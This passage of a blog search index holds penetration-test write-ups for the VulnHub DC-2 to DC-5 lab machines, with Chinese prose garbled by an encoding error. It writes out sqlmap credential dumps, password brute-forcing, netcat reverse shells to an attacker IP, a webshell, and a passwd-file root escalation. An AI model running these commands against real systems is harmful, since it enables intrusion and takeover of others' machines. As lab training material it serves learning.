        "summary": "vulnhub-DC:2æ¸—é€ç¬”è®° ä¿¡æ¯æœé›† IPæ¢æµ‹ è€è§„çŸ©ï¼Œå…ˆæ¢æµ‹ä¸€ä¸‹IPï¼š\nnmap -sP 192.168.111.0/24 ç¡®å®šIPä¸º192.168.111.144\nç«¯å£æ¢æµ‹ çœ‹çœ‹å¼€äº†å“ªäº›ç«¯å£ï¼š\nnmap -sV -p- 192.168.111.144 å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†ä¸¤ä¸ªç«¯å£ï¼š\n80ç«¯å£ï¼Œè¿™ä¸ªåº”è¯¥å°±æ˜¯webæœåŠ¡ 7744ç«¯å£ï¼Œä¼¼ä¹æ˜¯æŠŠsshæœåŠ¡é»˜è®¤çš„22æ”¹æˆäº†7744 ç½‘é¡µä¿¡æ¯æ”¶é›† æµè§ˆå™¨è®¿é—®80ç«¯å£çœ‹çœ‹ï¼š\nä¸èƒ½è®¿é—®ï¼Œä½†æ˜¾ç¤ºäº†ä¸ªdc-2ï¼Œè¿™é‡Œæ¶‰åŠä¸€ä¸ªdnsè§£æé¡ºåºçš„é—®é¢˜ï¼š\næ ¹æ®Windowsç³»ç»Ÿè§„å®šï¼Œåœ¨è¿›è¡ŒDNSè¯·æ±‚ä»¥å‰ï¼ŒWindowsç³»ç»Ÿä¼šå…ˆæ£€æŸ¥è‡ªå·±çš„Hostsæ–‡ä»¶ä¸­æ˜¯å¦æœ‰è¿™ä¸ªåœ°å€æ˜ å°„å…³ç³»ï¼Œå¦‚æœæœ‰åˆ™è°ƒç”¨è¿™ä¸ªIPåœ°å€æ˜ å°„ï¼Œå¦‚æœæ²¡æœ‰å†å‘å·²çŸ¥çš„DNSæœåŠ¡å™¨æå‡ºåŸŸåè§£æã€‚ ä¹Ÿå°±æ˜¯è¯´Hostsçš„è¯·æ±‚çº§åˆ«æ¯”DNSé«˜ æ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹C:/Windows/System32/drivers/etc/HOSTSæ–‡ä»¶è¿›è¡Œhostç¢°æ’ï¼š\nokç°åœ¨å†è®¿é—®ä¸€ä¸‹è¿›å…¥webæœåŠ¡ï¼š\nå¯ä»¥è®¿é—®äº†ä¸”å‘ç°äº†flag1ï¼š\nä½ é€šå¸¸ä½¿ç”¨çš„å­—å…¸å¯èƒ½è¡Œä¸é€šï¼Œæ‰€ä»¥ä¹Ÿè®¸ä½ éœ€è¦ä½¿ç”¨cewlã€‚ æ›´å¤šçš„å¯†ç æ€»æ˜¯æ›´å¥½ï¼Œä½†æœ‰æ—¶ä½ å°±æ˜¯æ— æ³•èµ¢å¾—æ‰€æœ‰çš„ã€‚ ç™»å½•ä¸ºä¸€ä¸ªç”¨æˆ·æ¥æŸ¥çœ‹ä¸‹ä¸€ä¸ªflag å¦‚æœæ‰¾ä¸åˆ°å®ƒï¼Œå°è¯•ä»¥å¦ä¸€ä¸ªèº«ä»½ç™»å½• ä»–è¿™é‡Œåº”è¯¥æ˜¯è®©æˆ‘ä½¿ç”¨cewlè¿›è¡Œå¯†ç æ”»å‡»ï¼Œä½†å¹¶ä¸ä»£è¡¨åªæœ‰è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥ç€çœ‹çœ‹\nä¾æ—§æ˜¯é€šè¿‡wappalyzerå¾—åˆ°webæœåŠ¡çš„åŸºæœ¬ä¿¡æ¯ï¼š\nwordpress 4.7.10 phpè¯­è¨€ Apache debianç³»ç»Ÿ mysqlæ•°æ®åº“ è¿˜æ˜¯dirsearchæ‰«ä¸€æ‰«ç›®å½•ï¼š\næ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«æœ‰ç”¨çš„ä¿¡æ¯\næ¼æ´åˆ©ç”¨ wordpressï¼ˆflag1ã€flag2ï¼‰ æ ¹æ®æç¤ºä½¿ç”¨kaliè‡ªå¸¦çš„cewlç”Ÿæˆå¯†ç å­—å…¸ï¼š\ncewl http://dc-2/ -w dict.txt\t//ä¿å­˜åœ¨dict.txtä¸­ è¿™ä¸ªtxtä½œä¸ºæˆ‘ä»¬åç»­çˆ†ç ´ç”¨çš„å­—å…¸\næ¥ä¸‹æ¥æŒ‰ç…§flag1çš„æç¤ºï¼Œæ˜¯è¦è¿›è¡Œç™»å½•ï¼Œé’ˆå¯¹wordpressä¸€èˆ¬å¯ä»¥è¯•è¯•wpscanï¼š\nç”¨wpscanæšä¸¾ä¸€ä¸‹ç”¨æˆ·å\nwpscan --url http://dc-2/ --enumerate u å‘ç°ä¸‰ä¸ªç”¨æˆ·åï¼Œæˆ‘ä»¬åŒæ ·å°†ä»–ä»¬ä¿å­˜è‡³user.txt\næ¥ä¸‹æ¥æ˜¯é’ˆå¯¹ç”¨æˆ·çš„å¯†ç çˆ†ç ´ï¼Œç”¨æˆ·åå’Œå¯†ç çš„å­—å…¸æŒ‡å®šä¸ºæˆ‘ä»¬ä¿å­˜çš„å­—å…¸ï¼š\nwpscan --url http://dc-2/ -U user.txt -P dict.txt å¯ä»¥çœ‹è§ï¼Œjerryå’Œtomçš„å¯†ç éƒ½è¢«çˆ†ç ´å‡ºæ¥äº†ï¼Œè®©æˆ‘ä»¬ç™»å½•è¯•è¯•\n"
    }
,
    {
        "title": "DC-3æ¸—é€ç¬”è®°",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-3%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/",
        "content": "DC-3.2æ¸—é€ç¬”è®° ä¿¡æ¯æœé›† IPæ¢æµ‹ ç«¯å£æ¢æµ‹ å‘ç°åªæœ‰80ç«¯å£å¼€å¯ï¼Œé‚£å°±ç›´æ¥çœ‹çœ‹webæœåŠ¡\nç½‘é¡µä¿¡æ¯æœé›† è¿™é‡Œæœ€é‡è¦çš„ä¿¡æ¯å°±æ˜¯è¿™ä¸ªcmsæ¨¡æ¿æ˜¯joomla\næ‰«ä¸€ä¸‹ç›®å½•ï¼š\nå¯ä»¥å‘ç°/administrator/æ˜¯åå°ï¼š\nåœ¨README.txtä¸­è®°å½•äº†ç‰ˆæœ¬å·ä¸º3.7\næŸ¥ä¸€ä¸‹æœ‰æ²¡æœ‰æ¼æ´ï¼š\nokå­˜åœ¨sqlæ³¨å…¥ï¼Œå‡†å¤‡åˆ©ç”¨\næ¼æ´åˆ©ç”¨ SQLæ³¨å…¥ æ–¹æ³•ä¸€ï¼šsqlmap çœ‹çœ‹æ¼æ´ç»†èŠ‚æè¿°ï¼š\nè¿˜æ˜¯ä¸ªCVEï¼Œè¿™é‡Œè¿sqlmapçš„å‘½ä»¤éƒ½ç»™å‡ºæ¥äº†ï¼Œç›´æ¥è·‘ä¸€æ‰‹sqlmap\nè·‘å‡ºæ¥5ä¸ªæ•°æ®åº“ï¼Œå†æŒ‰å¸¸è§„æµç¨‹æ¢­ä¸€ä¸‹ï¼š\nçˆ†å½“å‰åº“åï¼š\nsqlmap -u \u0026#34;http://192.168.40.159/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 --level=5 --random-agent -p list[fullordering] --current-db åº“åä¸ºjoomladb\nçˆ†è¡¨åï¼š\nsqlmap -u \u0026#34;http://192.168.111.191/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 -p list[fullordering] -D \u0026#34;joomladb\u0026#34; --tables ä¸€å…±76å¼ è¡¨ï¼Œ#__users è¿™ä¸ªè¡¨ä¸€çœ‹å°±å¾ˆæœ‰ç”¨ï¼Œçœ‹çœ‹\nçˆ†åˆ—åï¼š\nsqlmap -u \u0026#34;http://192.168.111.191/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 -p list[fullordering] -D \u0026#34;joomladb\u0026#34; --tables -T \u0026#34;#__users\u0026#34; --columns æ¥ä¸‹æ¥çˆ†usernameå’Œpasswordå­—æ®µï¼š\nsqlmap -u \u0026#34;http://192.168.111.191/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 -p list[fullordering] -D \u0026#34;joomladb\u0026#34; --tables -T \u0026#34;#__users\u0026#34; --columns -C \u0026#34;username,password\u0026#34; --dump æ‹¿åˆ°äº†adminçš„å¯†ç å“ˆå¸Œ\næ–¹æ³•äºŒï¼šæ¼æ´åº“è„šæœ¬ å½“ç„¶ï¼Œæˆ‘ä»¬åœ¨æœç´¢æ¼æ´çš„æ—¶å€™çœ‹è§è¿˜æœ‰ä¸ªphpè„šæœ¬ï¼Œè¯•è¯•èƒ½ä¸èƒ½æ¢­å“ˆï¼š\næŠŠè¿™ä¸ªphpæ–‡ä»¶cpåˆ°webç›®å½•ç„¶åè§£æï¼š\nè®¿é—®ç½‘é¡µï¼Œå¡«å¥½ç›®æ ‡urlå³å¯ä¸€æŠŠæ¢­ï¼š\nå¯†ç å“ˆå¸Œç ´è§£ ç”¨johnæ¥ç ´è§£ä¸€æ‰‹ï¼ŒæŠŠå“ˆå¸Œå†™è¿›adminpassç„¶åç”¨rockyouå­—å…¸çˆ†ç ´ï¼š\njohn adminpass --wordlist=/usr/share/wordlists/rockyou.txt å¾—åˆ°æ˜æ–‡å¯†ç snoopyï¼Œå¯ä»¥è¿›å…¥åå°çœ‹çœ‹äº†\nåå°getshell åœ¨åå°è‚¯å®šæ˜¯æ‰¾èƒ½å¤Ÿç¼–è¾‘phpæ–‡ä»¶çš„åœ°æ–¹äº†ï¼Œè€Œè¿™é‡Œçš„æ¨¡æ¿é‡Œå¯ä»¥æ–°å»ºphpæ–‡ä»¶ï¼š\næˆ‘ä»¬å†™ä¸€ä¸ªwebshellä»£ç è¿›å»ï¼Œè¿™é‡Œæˆ‘åœ¨beez3é‡Œé¢è¯•äº†å¾ˆä¹…ï¼Œæ–°å»ºæ–‡ä»¶å’Œå†™å…¥ç°æœ‰æ–‡ä»¶æ²¡æœ‰è¿ä¸Šï¼Œæœ€åå°†webshellå†™åœ¨protostarçš„index.phpé‡Œè¿ä¸Šäº†ï¼š\nèšå‰‘è¿æ¥ï¼š\næ¥ä¸‹æ¥åå¼¹shell:\nç”±äºè¿™é‡Œncæ²¡æœ‰eé€‰é¡¹ï¼Œæ‰€ä»¥æˆ‘æ¢äº†ä¸ªå‘½ä»¤ï¼š\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2\u0026gt;\u0026amp;1|nc 192.168.111.132 4444 \u0026gt;/tmp/f æˆåŠŸä¸Šçº¿kaliï¼Œæ¥ä¸‹æ¥è¿›å…¥ææƒé˜¶æ®µ\næƒé™æå‡ çœ‹çœ‹ç³»ç»Ÿå†…æ ¸ï¼š\nuname -a æŸ¥çœ‹Ubantuå‘è¡Œç‰ˆæœ¬\nlsb_release -a å¯çŸ¥ç³»ç»Ÿæ˜¯ubuntu 16.04\næœä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰æ´ï¼š\nokæœ‰æƒé™æå‡ï¼Œçœ‹çœ‹æè¿°ï¼š\nè¿™é‡Œç»™å‡ºäº†åˆ©ç”¨è„šæœ¬çš„ä¸‹è½½åœ°å€ï¼ˆproof of conceptï¼‰\nåœ¨é¶æœºä¸Šä¸‹è½½ï¼š\næ¥ä¸‹æ¥è§£å‹å¹¶è¿›å…¥è¯¥ç›®å½•ï¼š\nè§£å‹expå¹¶è¿›å…¥ç›®å½•ï¼š\næ¥ä¸‹æ¥æŒ‰ç…§æ¼æ´æè¿°æ–‡æœ¬ä¸­ç»™å‡ºçš„å‘½ä»¤è¿›è¡Œæ‰§è¡Œï¼Œæè¿°å¦‚ä¸‹ï¼š\nç›´æ¥ç…§ç€æ‰“ä¸€éï¼š\næˆåŠŸææƒåˆ°rootï¼Œå¤ªä¸‘äº†æ‹¿ä¸ªptyå…ˆï¼š\næ¥ä¸‹æ¥åœ¨/rootä¸­æ‹¿flagï¼š\næ€»ç»“ è¿™æ¬¡æ¸—é€è¿‡ç¨‹ï¼Œæœ‰å¦‚ä¸‹æ¼æ´æˆ–åˆ©ç”¨ï¼š\nè¯¥joomlaç‰ˆæœ¬å­˜åœ¨sqlæ³¨å…¥å†å²æ¼æ´ è·å¾—adminçš„å¯†ç å“ˆå¸Œåï¼Œä½¿ç”¨johnè¿›è¡Œçˆ†ç ´è·å–äº†æ˜æ–‡å¯†ç  joomlaåå°å­˜åœ¨æ¨¡æ¿ç¼–è¾‘ï¼Œå¯ä»¥åœ¨æ¨¡æ¿æ–‡ä»¶ä¸­å†™å…¥webshellä¸Šçº¿ è¯¥ä¸»æœºå¾—æ“ä½œç³»ç»Ÿubuntu 16.04å­˜åœ¨å†…æ ¸æ¼æ´ï¼Œå¯¼è‡´æƒé™æå‡ ",
        "summary": "DC-3.2æ¸—é€ç¬”è®° ä¿¡æ¯æœé›† IPæ¢æµ‹ ç«¯å£æ¢æµ‹ å‘ç°åªæœ‰80ç«¯å£å¼€å¯ï¼Œé‚£å°±ç›´æ¥çœ‹çœ‹webæœåŠ¡\nç½‘é¡µä¿¡æ¯æœé›† è¿™é‡Œæœ€é‡è¦çš„ä¿¡æ¯å°±æ˜¯è¿™ä¸ªcmsæ¨¡æ¿æ˜¯joomla\næ‰«ä¸€ä¸‹ç›®å½•ï¼š\nå¯ä»¥å‘ç°/administrator/æ˜¯åå°ï¼š\nåœ¨README.txtä¸­è®°å½•äº†ç‰ˆæœ¬å·ä¸º3.7\næŸ¥ä¸€ä¸‹æœ‰æ²¡æœ‰æ¼æ´ï¼š\nokå­˜åœ¨sqlæ³¨å…¥ï¼Œå‡†å¤‡åˆ©ç”¨\næ¼æ´åˆ©ç”¨ SQLæ³¨å…¥ æ–¹æ³•ä¸€ï¼šsqlmap çœ‹çœ‹æ¼æ´ç»†èŠ‚æè¿°ï¼š\nè¿˜æ˜¯ä¸ªCVEï¼Œè¿™é‡Œè¿sqlmapçš„å‘½ä»¤éƒ½ç»™å‡ºæ¥äº†ï¼Œç›´æ¥è·‘ä¸€æ‰‹sqlmap\nè·‘å‡ºæ¥5ä¸ªæ•°æ®åº“ï¼Œå†æŒ‰å¸¸è§„æµç¨‹æ¢­ä¸€ä¸‹ï¼š\nçˆ†å½“å‰åº“åï¼š\nsqlmap -u \u0026#34;http://192.168.40.159/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 --level=5 --random-agent -p list[fullordering] --current-db åº“åä¸ºjoomladb\nçˆ†è¡¨åï¼š\nsqlmap -u \u0026#34;http://192.168.111.191/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 -p list[fullordering] -D \u0026#34;joomladb\u0026#34; --tables ä¸€å…±76å¼ è¡¨ï¼Œ#__users è¿™ä¸ªè¡¨ä¸€çœ‹å°±å¾ˆæœ‰ç”¨ï¼Œçœ‹çœ‹\nçˆ†åˆ—åï¼š\nsqlmap -u \u0026#34;http://192.168.111.191/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 -p list[fullordering] -D \u0026#34;joomladb\u0026#34; --tables -T \u0026#34;#__users\u0026#34; --columns æ¥ä¸‹æ¥çˆ†usernameå’Œpasswordå­—æ®µï¼š\nsqlmap -u \u0026#34;http://192.168.111.191/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 -p list[fullordering] -D \u0026#34;joomladb\u0026#34; --tables -T \u0026#34;#__users\u0026#34; --columns -C \u0026#34;username,password\u0026#34; --dump "
    }
,
    {
        "title": "DC-4æ¸—é€ç¬”è®°",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-4%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/",
        "content": "DC-4æ¸—é€ç¬”è®° ä¿¡æ¯æœé›† æ¢æµ‹IP nmapæ‰«cæ®µï¼š\nnmap -sP 192.168.111.0/24 å¯ä»¥ç¡®å®šIPä¸º192.168.111.191\nç«¯å£æ¢æµ‹ nmapæ¢æµ‹ç«¯å£ï¼š\nnmap -sV -p- 192.168.111.191 å¯è§å¼€å¯äº†ä¸¤ä¸ªç«¯å£ï¼š\n22ç«¯å£ï¼ŒsshæœåŠ¡ 80ç«¯å£ï¼ŒhttpæœåŠ¡ ç½‘é¡µä¿¡æ¯æœé›† è€è§„çŸ©ï¼Œå…ˆçœ‹çœ‹80ç«¯å£çš„ç½‘é¡µï¼š\nä¸€ä¸ªç™»å½•æ¡†è€Œä¸”ä¸æ˜¯é€šç”¨çš„CMSï¼Œé‚£ä¹ˆæ€è·¯å°±æ”¾åœ¨ç™»å½•æ¡†å¯¹æŠ—ä¸Š\nå…ˆæ‰«ç›®å½•çœ‹çœ‹ï¼š\nç¡®å®æ²¡å•¥åˆ©ç”¨ç‚¹ï¼Œç›´æ¥å¼€å§‹æˆ‘ä»¬çš„ç™»å½•å£å¯¹æŠ—\næ¼æ´åˆ©ç”¨ ç™»å½•å£å¯¹æŠ— è¿™é‡Œé¦–å…ˆè€ƒè™‘å¼±å£ä»¤å’Œsqlæ³¨å…¥ï¼Œå…ˆæŠ“ä¸ªåŒ…çˆ†ç ´ä¸€ä¸‹ï¼š\nç”¨æˆ·åç”¨adminè¯•è¯•ï¼Œå¯†ç è·‘ä¸€ä¸‹å­—å…¸\nè¿™ä¸å°±çˆ†å‡ºæ¥äº†ï¼Œå¯†ç ä¸ºhappyï¼Œç›´æ¥ç™»å½•ï¼š\né¡ºåˆ©è¿›å…¥åå°ï¼Œè¿™é‡Œæœ‰ä¸ªæ‰§è¡Œå‘½ä»¤çš„é€‰é¡¹ï¼Œæˆ‘ä»¬ç‚¹runè¯•è¯•ï¼š è¿™é‡Œæ˜¯æ‰§è¡Œäº†ls -lï¼ŒæŠ“åŒ…çœ‹çœ‹å‘½ä»¤æ˜¯å¦å¯æ§å‘¢ï¼š å‘½ä»¤å¯æ§ï¼Œå°†å‘½ä»¤æ”¹ä¸ºwhoamiï¼ŒæˆåŠŸæ‰§è¡Œï¼Œæ€è·¯å¯¹äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è‚¯å®šæƒ³åˆ°åå¼¹shelläº†\nå‘½ä»¤æ‰§è¡Œåå¼¹shell kaliä¸Šå¼€å¯ç›‘å¬ï¼š\næ¥ä¸‹æ¥æ‰§è¡Œåå¼¹shellçš„å‘½ä»¤ï¼š\nnc 192.168.111.132 4444 -e /bin/bash æ³¨æ„å‚æ•°çš„ç©ºæ ¼æ”¹ä¸º+å·ï¼š\nè¿æ¥æˆåŠŸï¼š\nå¤ªä¸‘äº†ï¼Œpythonè·å–ä¸€ä¸ªptyï¼š\nèˆ’æœäº†ï¼Œæ¥ä¸‹æ¥åº”è¯¥å°±æ˜¯æƒé™æå‡äº†\næƒé™æå‡ hydraçˆ†ç ´ssh çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ç–‘çš„æ–‡ä»¶æ¯”å¦‚sudoï¼Œsuidä¹‹ç±»çš„ï¼š\næ²¡æœ‰å¤ªå¤šæ”¶è·ï¼Œå»å®¶ç›®å½•çœ‹çœ‹å‘¢ï¼š\nå¯è§æœ‰ä¸‰ä¸ªç”¨æˆ·ï¼Œè€Œjimç”¨æˆ·çš„æ–‡ä»¶æœ‰ç‚¹å¯ç–‘ï¼Œä»”ç»†çœ‹çœ‹ï¼š\nmboxåº”è¯¥æ˜¯ä¸ªé‚®ç®±ï¼Œä½†æƒé™ä¸å¤Ÿçœ‹ä¸äº†\ntest.shæ˜¯ä¸ªæ™®é€šè„šæœ¬æ–‡ä»¶ï¼Œä½†backupsæ–‡ä»¶å¤¹ä¸­æœ‰æ—§å¯†ç å¤‡ä»½ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°çˆ†ç ´sshäº†ï¼Œç”¨kaliè‡ªå¸¦çš„hydraä¸€ä¸‹ï¼š\nhydra -l jim -P ./pass.txt 192.168.111.191 ssh okäº†ï¼Œå¯†ç æ˜¯jibril04ï¼Œç›´æ¥sshè¿æ¥ï¼š\næˆåŠŸè·å¾—äº†jimçš„shell\né‚®ä»¶æ³„éœ²å¯†ç  çœ‹çœ‹jimæœ‰æ²¡æœ‰sudoæƒé™å‘¢ï¼š\nå¥½å§æ²¡æœ‰ï¼Œæ¢ä¸ªæ€è·¯ï¼Œåˆšæ‰æœ‰ä¸ªmboxæ–‡ä»¶è¿˜æ²¡çœ‹ï¼š\nç¡®å®æ˜¯ä¸ªæ­£å¸¸é‚®ä»¶ï¼Œè¯´æ˜è¯¥ç³»ç»Ÿæ˜¯å¼€å¯äº†é‚®ç®±æœåŠ¡çš„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹ç³»ç»Ÿé‚®ç®±ç›®å½•ï¼š\nå‘ç°charleså‘ç»™jimçš„é‚®ç®±ä¸­æ³„éœ²äº†å¯†ç ï¼Œæˆ‘ä»¬ç”¨è¯¥å¯†ç åˆ‡æ¢charlesç”¨æˆ·åˆ°è¯•è¯•ï¼š\næˆåŠŸåˆ‡æ¢åˆ°charles\nteeheeæ‰“sudoææƒ è¿˜æ˜¯è€è§„çŸ©ï¼Œçœ‹çœ‹sudoæƒé™ï¼š\nå‘ç°å¯ä»¥å…å¯†sudoæ‰§è¡Œ/usr/bin/teeheeï¼Œæ°å¥½teeheeå¯ä»¥ç”¨æ¥æ‰“sudoææƒï¼š\nteeheeæ˜¯ä¸ªå°ä¼—çš„linuxç¼–è¾‘å™¨ï¼Œææƒæ ¸å¿ƒæ€è·¯å°±æ˜¯åˆ©ç”¨å…¶åœ¨passwdæ–‡ä»¶ä¸­è¿½åŠ ä¸€æ¡uidä¸º0çš„ç”¨æˆ·æ¡ç›®ï¼š\necho \u0026#34;yuy0ung::0:0:::/bin/bash\u0026#34; | sudo teehee -a /etc/passwd æŒ‰ç…§linuxç”¨æˆ·æœºåˆ¶ï¼Œå¦‚æœæ²¡æœ‰shadowæ¡ç›®ï¼Œä¸”passwdç”¨æˆ·å¯†ç æ¡ç›®ä¸ºç©ºçš„æ—¶å€™ï¼Œå¯ä»¥æœ¬åœ°ç›´æ¥suç©ºå¯†ç ç™»å½•ã€‚æ‰€ä»¥åªéœ€è¦æ‰§è¡Œsu yuy0ungå°±å¯ä»¥ç™»å½•åˆ°yuy0ungç”¨æˆ·ï¼Œè€Œè¯¥ç”¨æˆ·å› ä¸ºuidä¸º0ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯rootæƒé™\næˆ‘ä»¬ç›´æ¥æ·»åŠ ä¸€ä¸ªrootæƒé™çš„ç©ºå¯†ç hackerè´¦æˆ·ï¼Œå¹¶ç›´æ¥suå…å¯†ç™»å½•ï¼š\næˆåŠŸææƒå¹¶åœ¨/rootä¸­æ‹¿åˆ°flag\næ€»ç»“ æœ¬æ¬¡æ¸—é€è¿‡ç¨‹æœ‰å¦‚ä¸‹æ¼æ´æˆ–åˆ©ç”¨ï¼š\nç½‘é¡µç™»å½•å£çš„å¼±å£ä»¤çˆ†ç ´ ç½‘é¡µåå°å‘½ä»¤æ‰§è¡Œå‚æ•°å¯æ§ ç”¨æˆ·å¤‡ä»½æ–‡ä»¶æ³„éœ²å¯†ç  hydraåˆ©ç”¨æ³„éœ²å¯†ç çˆ†ç ´ssh æ•æ„Ÿé‚®ä»¶æœªåˆ é™¤æ³„éœ²å¯†ç  teeheeå¯å…å¯†sudoæ‰§è¡Œå¯¼è‡´æƒé™æå‡ ",
        "summary": "DC-4æ¸—é€ç¬”è®° ä¿¡æ¯æœé›† æ¢æµ‹IP nmapæ‰«cæ®µï¼š\nnmap -sP 192.168.111.0/24 å¯ä»¥ç¡®å®šIPä¸º192.168.111.191\nç«¯å£æ¢æµ‹ nmapæ¢æµ‹ç«¯å£ï¼š\nnmap -sV -p- 192.168.111.191 å¯è§å¼€å¯äº†ä¸¤ä¸ªç«¯å£ï¼š\n22ç«¯å£ï¼ŒsshæœåŠ¡ 80ç«¯å£ï¼ŒhttpæœåŠ¡ ç½‘é¡µä¿¡æ¯æœé›† è€è§„çŸ©ï¼Œå…ˆçœ‹çœ‹80ç«¯å£çš„ç½‘é¡µï¼š\nä¸€ä¸ªç™»å½•æ¡†è€Œä¸”ä¸æ˜¯é€šç”¨çš„CMSï¼Œé‚£ä¹ˆæ€è·¯å°±æ”¾åœ¨ç™»å½•æ¡†å¯¹æŠ—ä¸Š\nå…ˆæ‰«ç›®å½•çœ‹çœ‹ï¼š\nç¡®å®æ²¡å•¥åˆ©ç”¨ç‚¹ï¼Œç›´æ¥å¼€å§‹æˆ‘ä»¬çš„ç™»å½•å£å¯¹æŠ—\næ¼æ´åˆ©ç”¨ ç™»å½•å£å¯¹æŠ— è¿™é‡Œé¦–å…ˆè€ƒè™‘å¼±å£ä»¤å’Œsqlæ³¨å…¥ï¼Œå…ˆæŠ“ä¸ªåŒ…çˆ†ç ´ä¸€ä¸‹ï¼š\nç”¨æˆ·åç”¨adminè¯•è¯•ï¼Œå¯†ç è·‘ä¸€ä¸‹å­—å…¸\nè¿™ä¸å°±çˆ†å‡ºæ¥äº†ï¼Œå¯†ç ä¸ºhappyï¼Œç›´æ¥ç™»å½•ï¼š\né¡ºåˆ©è¿›å…¥åå°ï¼Œè¿™é‡Œæœ‰ä¸ªæ‰§è¡Œå‘½ä»¤çš„é€‰é¡¹ï¼Œæˆ‘ä»¬ç‚¹runè¯•è¯•ï¼š è¿™é‡Œæ˜¯æ‰§è¡Œäº†ls -lï¼ŒæŠ“åŒ…çœ‹çœ‹å‘½ä»¤æ˜¯å¦å¯æ§å‘¢ï¼š å‘½ä»¤å¯æ§ï¼Œå°†å‘½ä»¤æ”¹ä¸ºwhoamiï¼ŒæˆåŠŸæ‰§è¡Œï¼Œæ€è·¯å¯¹äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è‚¯å®šæƒ³åˆ°åå¼¹shelläº†\nå‘½ä»¤æ‰§è¡Œåå¼¹shell kaliä¸Šå¼€å¯ç›‘å¬ï¼š\næ¥ä¸‹æ¥æ‰§è¡Œåå¼¹shellçš„å‘½ä»¤ï¼š\nnc 192.168.111.132 4444 -e /bin/bash æ³¨æ„å‚æ•°çš„ç©ºæ ¼æ”¹ä¸º+å·ï¼š\nè¿æ¥æˆåŠŸï¼š\nå¤ªä¸‘äº†ï¼Œpythonè·å–ä¸€ä¸ªptyï¼š\nèˆ’æœäº†ï¼Œæ¥ä¸‹æ¥åº”è¯¥å°±æ˜¯æƒé™æå‡äº†\næƒé™æå‡ hydraçˆ†ç ´ssh çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ç–‘çš„æ–‡ä»¶æ¯”å¦‚sudoï¼Œsuidä¹‹ç±»çš„ï¼š\næ²¡æœ‰å¤ªå¤šæ”¶è·ï¼Œå»å®¶ç›®å½•çœ‹çœ‹å‘¢ï¼š\nå¯è§æœ‰ä¸‰ä¸ªç”¨æˆ·ï¼Œè€Œjimç”¨æˆ·çš„æ–‡ä»¶æœ‰ç‚¹å¯ç–‘ï¼Œä»”ç»†çœ‹çœ‹ï¼š\nmboxåº”è¯¥æ˜¯ä¸ªé‚®ç®±ï¼Œä½†æƒé™ä¸å¤Ÿçœ‹ä¸äº†\ntest.shæ˜¯ä¸ªæ™®é€šè„šæœ¬æ–‡ä»¶ï¼Œä½†backupsæ–‡ä»¶å¤¹ä¸­æœ‰æ—§å¯†ç å¤‡ä»½ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°çˆ†ç ´sshäº†ï¼Œç”¨kaliè‡ªå¸¦çš„hydraä¸€ä¸‹ï¼š\nhydra -l jim -P ./pass.txt 192.168.111.191 ssh "
    }
,
    {
        "title": "DC-5æ¸—é€ç¬”è®°",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-5%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/",
        "content": "DC-5æ¸—é€ç¬”è®° ä¿¡æ¯æœé›† ç»è¿‡å‰é¢å‡ ä¸ªé¶æœºçš„ç»ƒä¹ ï¼Œå·²ç»è½»è½¦ç†Ÿè·¯äº†ï¼š\nä¿¡æ¯æœé›†ä¸€æ¡é¾™ï¼Œå¯çŸ¥ï¼š\nIPä¸º192.168.111.145 å¼€æ”¾äº†80ã€111ã€47890ä¸‰ä¸ªç«¯å£ ç›®å½•æ‰«æåˆ°ä¸€ç‚¹ç‚¹å¯è®¿é—®è·¯å¾„ 